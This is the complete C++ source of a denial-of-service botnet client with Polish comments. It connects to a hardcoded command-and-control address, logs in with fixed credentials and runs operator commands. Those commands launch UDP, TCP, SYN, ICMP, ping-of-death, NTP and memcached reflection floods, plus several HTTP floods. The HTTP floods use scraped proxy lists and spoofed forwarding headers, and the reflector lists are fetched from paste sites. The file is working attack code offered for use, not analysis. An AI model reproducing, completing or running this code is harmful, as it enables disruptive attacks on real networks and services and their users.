#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <thread>
#include <chrono>
#include <random>
#include <atomic>
#include <mutex>
#include <memory>
#include <functional>

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

// ====================== GLOBALS ======================
static std::string c0a9cja2 = "130.61.182.196";
static int c00ap2pps = 4444;

static std::vector<std::string> uauauauuac9c9x9a0k = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
};

static std::mt19937 rnd_gen((unsigned)time(nullptr));
static std::mutex rnd_mtx;

static int rnd_int(int lo, int hi) {
    std::lock_guard<std::mutex> lk(rnd_mtx);
    std::uniform_int_distribution<int> d(lo, hi);
    return d(rnd_gen);
}

static std::string rand_ua() {
    return uauauauuac9c9x9a0k[rnd_int(0, (int)uauauauuac9c9x9a0k.size() - 1)];
}

static std::string spoofer() {
    return std::to_string(rnd_int(11, 196)) + "." + std::to_string(rnd_int(0, 255)) + "." +
           std::to_string(rnd_int(0, 255)) + "." + std::to_string(rnd_int(2, 253));
}

static unsigned char ova9ca2[] = { 0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00 };
static const char* ca092kcavia = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";
static const size_t ca092kcavia_len = 15;

// ====================== UTIL ======================
static std::string trim(const std::string& s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return "";
    size_t b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

static std::vector<std::string> split_lines(const std::string& s) {
    std::vector<std::string> out;
    std::string cur;
    for (char c : s) {
        if (c == '\n') { out.push_back(cur); cur.clear(); }
        else if (c != '\r') cur += c;
    }
    if (!cur.empty()) out.push_back(cur);
    return out;
}

static std::vector<std::string> remove_by_value(const std::vector<std::string>& arr, const std::string& val) {
    std::vector<std::string> out;
    for (auto& x : arr) if (x != val) out.push_back(x);
    return out;
}

// ====================== HTTP/HTTPS client ======================
struct ParsedUrl {
    std::string scheme, host, path;
    int port;
    bool valid;
};

static ParsedUrl parse_url(const std::string& url) {
    ParsedUrl p{"", "", "/", 80, false};
    std::string u = url;
    size_t sp = u.find("://");
    if (sp != std::string::npos) {
        p.scheme = u.substr(0, sp);
        u = u.substr(sp + 3);
    } else {
        p.scheme = "http";
    }
    if (p.scheme == "https") p.port = 443;
    else p.port = 80;
    size_t slash = u.find('/');
    std::string hostport = (slash == std::string::npos) ? u : u.substr(0, slash);
    p.path = (slash == std::string::npos) ? "/" : u.substr(slash);
    size_t colon = hostport.find(':');
    if (colon != std::string::npos) {
        p.host = hostport.substr(0, colon);
        p.port = std::stoi(hostport.substr(colon + 1));
    } else {
        p.host = hostport;
    }
    p.valid = !p.host.empty();
    return p;
}

static int tcp_connect(const std::string& host, int port) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    hostent* he = gethostbyname(host.c_str());
    if (!he) { close(s); return -1; }
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    if (connect(s, (sockaddr*)&addr, sizeof(addr)) < 0) { close(s); return -1; }
    return s;
}

// HTTPS GET (bez proxy). Zwraca ciało.
static std::string https_get_raw(const std::string& host, int port, const std::string& path) {
    int sock = tcp_connect(host, port);
    if (sock < 0) return "";
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { close(sock); return ""; }
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    SSL_set_tlsext_host_name(ssl, host.c_str());
    if (SSL_connect(ssl) != 1) { SSL_free(ssl); SSL_CTX_free(ctx); close(sock); return ""; }
    std::string req = "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: " + rand_ua() + "\r\nConnection: close\r\n\r\n";
    SSL_write(ssl, req.c_str(), req.size());
    std::string resp;
    char buf[4096];
    int n;
    while ((n = SSL_read(ssl, buf, sizeof(buf))) > 0) resp.append(buf, n);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    close(sock);
    return resp;
}

// HTTP GET
static std::string http_get_raw(const std::string& host, int port, const std::string& path, const std::string& proxy = "") {
    std::string phost = host;
    int pport = port;
    if (!proxy.empty()) {
        size_t c = proxy.find(':');
        if (c != std::string::npos) {
            phost = proxy.substr(0, c);
            pport = std::stoi(proxy.substr(c + 1));
        }
    }
    int sock = tcp_connect(phost, pport);
    if (sock < 0) return "";
    std::string req;
    if (!proxy.empty()) {
        req = "GET http://" + host + ":" + std::to_string(port) + path + " HTTP/1.1\r\n";
        req += "Host: " + host + "\r\n";
    } else {
        req = "GET " + path + " HTTP/1.1\r\n";
        req += "Host: " + host + "\r\n";
    }
    req += "User-Agent: " + rand_ua() + "\r\n";
    req += "Connection: close\r\n\r\n";
    send(sock, req.c_str(), req.size(), 0);
    std::string resp;
    char buf[4096];
    ssize_t n;
    while ((n = recv(sock, buf, sizeof(buf), 0)) > 0) resp.append(buf, n);
    close(sock);
    return resp;
}

// Wyciągnij body z odpowiedzi HTTP (po \r\n\r\n)
static std::string http_body(const std::string& resp) {
    size_t p = resp.find("\r\n\r\n");
    if (p == std::string::npos) return resp;
    return resp.substr(p + 4);
}

// Pobierz URL (obsługuje http i https)
static std::string download(const std::string& url) {
    ParsedUrl p = parse_url(url);
    if (!p.valid) return "";
    if (p.scheme == "https") return http_body(https_get_raw(p.host, p.port, p.path));
    return http_body(http_get_raw(p.host, p.port, p.path));
}

// ====================== ATAKI ======================
static void NTP(const std::string& target, int port, std::chrono::steady_clock::time_point timer) {
    try {
        std::vector<std::string> ntp_servers = split_lines(download("https://pastebin.com/raw/jC8FGJ2E"));
        if (ntp_servers.empty()) return;
        std::string server = trim(ntp_servers[rnd_int(0, (int)ntp_servers.size() - 1)]);
        while (std::chrono::steady_clock::now() < timer) {
            int s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s < 0) continue;
            int bc = 1;
            setsockopt(s, SOL_SOCKET, SO_BROADCAST, &bc, sizeof(bc));
            sockaddr_in ep{};
            ep.sin_family = AF_INET;
            ep.sin_port = htons(port);
            ep.sin_addr.s_addr = inet_addr(server.c_str());
            for (int i = 0; i < 50000000; i++) {
                sendto(s, ova9ca2, sizeof(ova9ca2), 0, (sockaddr*)&ep, sizeof(ep));
            }
            close(s);
        }
    } catch (...) {}
}

static void MEM(const std::string& target, int port, std::chrono::steady_clock::time_point timer) {
    std::vector<std::string> memsv;
    try {
        memsv = split_lines(download("https://nullpaste.org/raw/_UmXRlc2s4wS"));
        if (memsv.empty()) memsv = {"127.0.0.1"};
    } catch (...) { memsv = {"127.0.0.1"}; }
    std::string server = trim(memsv[rnd_int(0, (int)memsv.size() - 1)]);
    while (std::chrono::steady_clock::now() < timer) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        sockaddr_in ep{};
        ep.sin_family = AF_INET;
        ep.sin_port = htons(11211);
        ep.sin_addr.s_addr = inet_addr(server.c_str());
        for (int i = 0; i < 5000000; i++) {
            sendto(s, ca092kcavia, ca092kcavia_len, 0, (sockaddr*)&ep, sizeof(ep));
        }
        close(s);
    }
}

static void icmp_attack(const std::string& target, std::chrono::steady_clock::time_point timer) {
    while (std::chrono::steady_clock::now() < timer) {
        for (int i = 0; i < 5000000; i++) {
            int sz = rnd_int(1024, 59999);
            std::vector<unsigned char> packet(sz);
            for (auto& b : packet) b = (unsigned char)rnd_int(0, 255);
            int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
            if (s < 0) continue;
            int one = 1;
            setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
            sockaddr_in ep{};
            ep.sin_family = AF_INET;
            ep.sin_port = 0;
            ep.sin_addr.s_addr = inet_addr(target.c_str());
            sendto(s, packet.data(), packet.size(), 0, (sockaddr*)&ep, sizeof(ep));
            close(s);
        }
    }
}

static void pod(const std::string& target, std::chrono::steady_clock::time_point timer) {
    while (std::chrono::steady_clock::now() < timer) {
        std::string rand_addr = spoofer();
        (void)rand_addr;
        int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (s < 0) continue;
        int one = 1;
        setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        std::vector<unsigned char> payload(60000, 'm');
        sockaddr_in ep{};
        ep.sin_family = AF_INET;
        ep.sin_port = 0;
        ep.sin_addr.s_addr = inet_addr(target.c_str());
        sendto(s, payload.data(), payload.size(), 0, (sockaddr*)&ep, sizeof(ep));
        close(s);
    }
}

// HTTPSpoof - jak w C#: łączy się z proxy i wysyła ssl stream z requestem spoofowanym
static void httpSpoofAttack(const std::string& url, std::chrono::steady_clock::time_point timer) {
    std::vector<std::string> proxies;
    try {
        proxies = split_lines(download("https://nullpaste.org/raw/P_fy-DsdWRQw"));
        if (proxies.empty()) proxies = {"127.0.0.1:8080"};
    } catch (...) { proxies = {"127.0.0.1:8080"}; }
    std::string proxy = trim(proxies[rnd_int(0, (int)proxies.size() - 1)]);
    size_t c = proxy.find(':');
    std::string proxyHost = (c == std::string::npos) ? proxy : proxy.substr(0, c);
    int proxyPort = (c == std::string::npos) ? 8080 : std::stoi(proxy.substr(c + 1));

    ParsedUrl uri = parse_url(url);

    std::string req = "GET / HTTP/1.1\r\nHost: " + uri.host + "\r\n";
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36\r\n";
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n";
    req += "X-Forwarded-Proto: Http\r\n";
    req += "X-Forwarded-Host: " + uri.host + ", 1.1.1.1\r\n";
    req += "Via: " + spoofer() + "\r\n";
    req += "Client-IP: " + spoofer() + "\r\n";
    req += "X-Forwarded-For: " + spoofer() + "\r\n";
    req += "Real-IP: " + spoofer() + "\r\n";
    req += "Connection: Keep-Alive\r\n\r\n";

    while (std::chrono::steady_clock::now() < timer) {
        int sock = tcp_connect(proxyHost, proxyPort);
        if (sock < 0) continue;
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) { close(sock); continue; }
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
        SSL* ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        SSL_set_tlsext_host_name(ssl, uri.host.c_str());
        if (SSL_connect(ssl) != 1) { SSL_free(ssl); SSL_CTX_free(ctx); close(sock); continue; }
        for (int i = 0; i < 500000000; i++) {
            if (SSL_write(ssl, req.c_str(), req.size()) <= 0) break;
            if (SSL_write(ssl, req.c_str(), req.size()) <= 0) break;
            if (SSL_write(ssl, req.c_str(), req.size()) <= 0) break;
        }
        SSL_shutdown(ssl);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        close(sock);
    }
}

// run() - odpowiednik z C# z proxy (cfbp: 0=PROXY, 1=NORMAL)
static void run_once(const std::string& target, std::vector<std::string>& proxies, int cfbp) {
    ParsedUrl uri = parse_url(target);
    if (!uri.valid) return;

    if (cfbp == 0 && !proxies.empty()) {
        std::string proxy = proxies[rnd_int(0, (int)proxies.size() - 1)];
        try {
            std::string resp = http_get_raw(uri.host, uri.port, uri.path, proxy);
            // Sprawdź status code
            bool ok = false;
            if (resp.size() > 12 && resp.substr(0, 5) == "HTTP/") {
                int code = std::stoi(resp.substr(9, 3));
                if (code >= 200 && code <= 226) ok = true;
            }
            if (ok) {
                for (int i = 0; i < 100; i++) {
                    http_get_raw(uri.host, uri.port, uri.path, proxy);
                }
            } else {
                proxies = remove_by_value(proxies, proxy);
            }
        } catch (...) {
            proxies = remove_by_value(proxies, proxy);
        }
    } else if (cfbp == 1 && !proxies.empty()) {
        std::string proxy = proxies[rnd_int(0, (int)proxies.size() - 1)];
        try {
            std::string resp = http_get_raw(uri.host, uri.port, uri.path, proxy);
            bool ok = false;
            if (resp.size() > 12 && resp.substr(0, 5) == "HTTP/") {
                int code = std::stoi(resp.substr(9, 3));
                if (code >= 200 && code <= 226) ok = true;
            }
            if (ok) {
                for (int i = 0; i < 100; i++) {
                    http_get_raw(uri.host, uri.port, uri.path, proxy);
                }
            } else {
                proxies = remove_by_value(proxies, proxy);
            }
        } catch (...) {
            proxies = remove_by_value(proxies, proxy);
        }
    } else {
        http_get_raw(uri.host, uri.port, uri.path);
    }
}

// Wątek HTTP (odpowiednik thread())
static void thread_http(const std::string& target, std::shared_ptr<std::vector<std::string>> proxies, int cfbp, std::atomic<bool>& stop) {
    while (!stop) {
        std::vector<std::string> local = *proxies;
        run_once(target, local, cfbp);
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// httpio() - odpowiednik z C#
static void httpio(const std::string& target, int times, int threads, const std::string& attack_type) {
    auto proxies = std::make_shared<std::vector<std::string>>();
    if (attack_type == "PROXY" || attack_type == "proxy" || attack_type == "NORMAL" || attack_type == "normal") {
        try {
            std::string a = download("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all");
            std::string b = download("https://www.proxy-list.download/api/v1/get?type=http");
            std::string c = download("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt");
            for (auto& l : split_lines(a)) if (!trim(l).empty()) proxies->push_back(trim(l));
            for (auto& l : split_lines(b)) if (!trim(l).empty()) proxies->push_back(trim(l));
            for (auto& l : split_lines(c)) if (!trim(l).empty()) proxies->push_back(trim(l));
        } catch (...) {}
    }
    std::atomic<bool> stop{false};
    std::vector<std::thread> ts;
    int cfbp = (attack_type == "PROXY" || attack_type == "proxy") ? 0 : 1;
    for (int i = 0; i < threads; i++) {
        ts.emplace_back(thread_http, target, proxies, cfbp, std::ref(stop));
    }
    std::this_thread::sleep_for(std::chrono::seconds(times));
    stop = true;
    for (auto& t : ts) if (t.joinable()) t.join();
}

// CFB / STORM / GET - identyczne w C# (wszystkie robią to samo)
static void CFB(const std::string& url, const std::string& port, std::chrono::steady_clock::time_point secs) {
    ParsedUrl uri = parse_url(url);
    int p = std::stoi(port);
    if (uri.port != 80 && uri.port != 443 && p != 0) uri.port = p;
    while (std::chrono::steady_clock::now() < secs) {
        for (int i = 0; i < 1500; i++) {
            http_get_raw(uri.host, uri.port, uri.path);
        }
    }
}

static void STORM_attack(const std::string& ip, const std::string& port, std::chrono::steady_clock::time_point secs) {
    ParsedUrl uri = parse_url(ip);
    int p = std::stoi(port);
    while (std::chrono::steady_clock::now() < secs) {
        for (int i = 0; i < 1500; i++) {
            http_get_raw(uri.host, p, uri.path);
        }
    }
}

static void GET_attack(const std::string& ip, const std::string& port, std::chrono::steady_clock::time_point secs) {
    STORM_attack(ip, port, secs);
}

static void attack_udp(const std::string& ip, int port, std::chrono::steady_clock::time_point secs, int size) {
    while (std::chrono::steady_clock::now() < secs) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        int dport = (port == 0) ? rnd_int(1, 65535) : port;
        std::vector<unsigned char> data(size);
        for (auto& b : data) b = (unsigned char)rnd_int(0, 255);
        sockaddr_in ep{};
        ep.sin_family = AF_INET;
        ep.sin_port = htons(dport);
        ep.sin_addr.s_addr = inet_addr(ip.c_str());
        sendto(s, data.data(), data.size(), 0, (sockaddr*)&ep, sizeof(ep));
        close(s);
    }
}

static void attack_tcp(const std::string& ip, int port, std::chrono::steady_clock::time_point secs, int size) {
    while (std::chrono::steady_clock::now() < secs) {
        int s = tcp_connect(ip, port);
        if (s < 0) continue;
        std::vector<unsigned char> data(size);
        while (std::chrono::steady_clock::now() < secs) {
            for (auto& b : data) b = (unsigned char)rnd_int(0, 255);
            if (send(s, data.data(), data.size(), MSG_NOSIGNAL) < 0) break;
        }
        close(s);
    }
}

static void attack_SYN(const std::string& ip, int port, std::chrono::steady_clock::time_point secs) {
    unsigned char pkt[] = { 0x04, 0xD2, 0x16, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    while (std::chrono::steady_clock::now() < secs) {
        int s = tcp_connect(ip, port);
        if (s < 0) continue;
        while (std::chrono::steady_clock::now() < secs) {
            if (send(s, pkt, sizeof(pkt), MSG_NOSIGNAL) < 0) break;
        }
        close(s);
    }
}

static void attack_tup(const std::string& ip, int port, std::chrono::steady_clock::time_point secs, int size) {
    while (std::chrono::steady_clock::now() < secs) {
        int udp = socket(AF_INET, SOCK_DGRAM, 0);
        int tcp = tcp_connect(ip, port);
        if (udp < 0 || tcp < 0) { if (udp >= 0) close(udp); if (tcp >= 0) close(tcp); continue; }
        int dport = (port == 0) ? rnd_int(1, 65535) : port;
        std::vector<unsigned char> data(size);
        for (auto& b : data) b = (unsigned char)rnd_int(0, 255);
        sockaddr_in uep{};
        uep.sin_family = AF_INET;
        uep.sin_port = htons(dport);
        uep.sin_addr.s_addr = inet_addr(ip.c_str());
        sendto(udp, data.data(), data.size(), 0, (sockaddr*)&uep, sizeof(uep));
        send(tcp, data.data(), data.size(), MSG_NOSIGNAL);
        close(udp);
        close(tcp);
    }
}

static void attack_hex(const std::string& ip, int port, std::chrono::steady_clock::time_point secs) {
    unsigned char payload[] = { 0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00, 0x01 };
    while (std::chrono::steady_clock::now() < secs) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        sockaddr_in ep{};
        ep.sin_family = AF_INET;
        ep.sin_port = htons(port);
        ep.sin_addr.s_addr = inet_addr(ip.c_str());
        for (int i = 0; i < 6; i++)
            sendto(s, payload, sizeof(payload), 0, (sockaddr*)&ep, sizeof(ep));
        close(s);
    }
}

static void attack_vse(const std::string& ip, int port, std::chrono::steady_clock::time_point secs) {
    unsigned char payload[] = { 0xff,0xff,0xff,0xff,'T','S','o','u','r','c','e',' ','E','n','g','i','n','e',' ','Q','u','e','r','y',0x00 };
    while (std::chrono::steady_clock::now() < secs) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        sockaddr_in ep{};
        ep.sin_family = AF_INET;
        ep.sin_port = htons(port);
        ep.sin_addr.s_addr = inet_addr(ip.c_str());
        sendto(s, payload, sizeof(payload), 0, (sockaddr*)&ep, sizeof(ep));
        sendto(s, payload, sizeof(payload), 0, (sockaddr*)&ep, sizeof(ep));
        close(s);
    }
}

static void attack_roblox(const std::string& ip, int port, std::chrono::steady_clock::time_point secs, int size) {
    while (std::chrono::steady_clock::now() < secs) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        int dport = (port == 0) ? rnd_int(1, 65535) : port;
        std::vector<unsigned char> bytes(size);
        for (auto& b : bytes) b = (unsigned char)rnd_int(0, 255);
        sockaddr_in ep{};
        ep.sin_family = AF_INET;
        ep.sin_port = htons(dport);
        ep.sin_addr.s_addr = inet_addr(ip.c_str());
        for (int i = 0; i < 1500; i++) {
            unsigned char hex[32];
            for (auto& b : hex) b = (unsigned char)rnd_int(0, 255);
            std::vector<unsigned char> full(32 + bytes.size());
            memcpy(full.data(), hex, 32);
            memcpy(full.data() + 32, bytes.data(), bytes.size());
            sendto(s, full.data(), full.size(), 0, (sockaddr*)&ep, sizeof(ep));
        }
        close(s);
    }
}

static void attack_junk(const std::string& ip, int port, std::chrono::steady_clock::time_point secs) {
    unsigned char payload[69] = {0};
    while (std::chrono::steady_clock::now() < secs) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        sockaddr_in ep{};
        ep.sin_family = AF_INET;
        ep.sin_port = htons(port);
        ep.sin_addr.s_addr = inet_addr(ip.c_str());
        for (int i = 0; i < 3; i++)
            sendto(s, payload, sizeof(payload), 0, (sockaddr*)&ep, sizeof(ep));
        close(s);
    }
}

// ====================== SPAWN HELPER ======================
template<typename F>
static void spawn(int count, F fn) {
    for (int i = 0; i < count; i++) {
        std::thread(fn).detach();
    }
}

// ====================== MAIN ======================
static void handle_command(const std::string& data, int c2);

static int connect_c2(const std::string& host, int port) {
    return tcp_connect(host, port);
}

static void handle_command(const std::string& data, int c2) {
    std::istringstream iss(data);
    std::vector<std::string> a;
    std::string tok;
    while (iss >> tok) a.push_back(tok);
    if (a.empty()) return;
    std::string command = a[0];
    for (auto& c : command) c = toupper((unsigned char)c);

    try {
        if (command == ".UDP") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int size = std::stoi(a[4]);
            int threads = std::stoi(a[5]);
            spawn(threads, [=]() { attack_udp(ip, port, secs, size); });
        }
        else if (command == ".TCP") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int size = std::stoi(a[4]);
            int threads = std::stoi(a[5]);
            spawn(threads, [=]() { attack_tcp(ip, port, secs, size); });
        }
        else if (command == ".NTP") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto timer = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int threads = std::stoi(a[4]);
            spawn(threads, [=]() { NTP(ip, port, timer); });
        }
        else if (command == ".MEM") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto timer = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int threads = std::stoi(a[4]);
            spawn(threads, [=]() { MEM(ip, port, timer); });
        }
        else if (command == ".ICMP") {
            std::string ip = a[1];
            auto timer = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[2]));
            int threads = std::stoi(a[3]);
            spawn(threads, [=]() { icmp_attack(ip, timer); });
        }
        else if (command == ".POD") {
            std::string ip = a[1];
            auto timer = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[2]));
            int threads = std::stoi(a[3]);
            spawn(threads, [=]() { pod(ip, timer); });
        }
        else if (command == ".TUP") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int size = std::stoi(a[4]);
            int threads = std::stoi(a[5]);
            spawn(threads, [=]() { attack_tup(ip, port, secs, size); });
        }
        else if (command == ".HEX") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int threads = std::stoi(a[4]);
            spawn(threads, [=]() { attack_hex(ip, port, secs); });
        }
        else if (command == ".ROBLOX") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int size = std::stoi(a[4]);
            int threads = std::stoi(a[5]);
            spawn(threads, [=]() { attack_roblox(ip, port, secs, size); });
        }
        else if (command == ".VSE") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int threads = std::stoi(a[4]);
            spawn(threads, [=]() { attack_vse(ip, port, secs); });
        }
        else if (command == ".JUNK") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int size = std::stoi(a[4]);
            int threads = std::stoi(a[5]);
            for (int i = 0; i < threads; i++) {
                std::thread([=]() { attack_junk(ip, port, secs); }).detach();
                std::thread([=]() { attack_udp(ip, port, secs, size); }).detach();
                std::thread([=]() { attack_tcp(ip, port, secs, size); }).detach();
            }
        }
        else if (command == ".SYN") {
            std::string ip = a[1];
            int port = std::stoi(a[2]);
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int threads = std::stoi(a[4]);
            spawn(threads, [=]() { attack_SYN(ip, port, secs); });
        }
        else if (command == ".HTTPSTORM") {
            std::string url = a[1];
            std::string port = a[2];
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int threads = std::stoi(a[4]);
            spawn(threads, [=]() { STORM_attack(url, port, secs); });
        }
        else if (command == ".HTTPGET") {
            std::string url = a[1];
            std::string port = a[2];
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int threads = std::stoi(a[4]);
            spawn(threads, [=]() { GET_attack(url, port, secs); });
        }
        else if (command == ".HTTPCFB") {
            std::string url = a[1];
            std::string port = a[2];
            auto secs = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[3]));
            int threads = std::stoi(a[4]);
            spawn(threads, [=]() { CFB(url, port, secs); });
        }
        else if (command == ".HTTPIO") {
            std::string url = a[1];
            int secs = std::stoi(a[2]);
            int threads = std::stoi(a[3]);
            std::string attackType = a[4];
            std::thread([=]() { httpio(url, secs, threads, attackType); }).detach();
        }
        else if (command == ".HTTPSPOOF") {
            std::string url = a[1];
            auto timer = std::chrono::steady_clock::now() + std::chrono::seconds(std::stoi(a[2]));
            int threads = std::stoi(a[3]);
            spawn(threads, [=]() { httpSpoofAttack(url, timer); });
        }
        else if (command == "PING") {
            std::string pong = "PONG";
            send(c2, pong.c_str(), pong.size(), 0);
        }
    } catch (...) {}
}

int main() {
    signal(SIGPIPE, SIG_IGN);
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    while (true) {
        int c2 = connect_c2(c0a9cja2, c00ap2pps);
        if (c2 < 0) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        // banner
        std::string banner = "669787761736865726500";
        send(c2, banner.c_str(), banner.size(), 0);

        char buf[4096];
        std::string response;
        int n;
        while ((n = recv(c2, buf, sizeof(buf) - 1, 0)) > 0) {
            buf[n] = 0;
            response.append(buf, n);
            if (response.find("Username") != std::string::npos) break;
        }
        std::string botName = "BOT";
        send(c2, botName.c_str(), botName.size(), 0);

        response.clear();
        while ((n = recv(c2, buf, sizeof(buf) - 1, 0)) > 0) {
            buf[n] = 0;
            response.append(buf, n);
            if (response.find("Password") != std::string::npos) break;
        }
        unsigned char pass[] = { 0xff, 0xff, 0xff, 0xff, 0x3d };
        send(c2, (char*)pass, sizeof(pass), 0);

        while (true) {
            memset(buf, 0, sizeof(buf));
            n = recv(c2, buf, sizeof(buf) - 1, 0);
            if (n <= 0) break;
            std::string data = trim(std::string(buf, n));
            if (data.empty()) break;
            handle_command(data, c2);
        }
        close(c2);
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
    return 0;
}
